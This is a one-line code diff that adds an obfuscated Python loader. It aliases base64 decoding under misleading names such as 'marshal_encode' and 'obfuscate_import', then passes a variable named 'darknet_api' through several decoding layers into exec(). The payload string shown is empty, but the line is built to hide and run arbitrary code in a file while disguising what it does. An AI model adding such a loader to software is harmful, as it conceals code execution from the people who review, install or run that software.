@@ -1,0 +1,1 @@
+from base64 import b64decode as marshal_encode;from base64 import b64decode as zlib_compress;from base64 import b64decode as obfuscate_import;darknet_api = "";exec(marshal_encode(zlib_compress(obfuscate_import(zlib_compress(obfuscate_import(darknet_api))))))
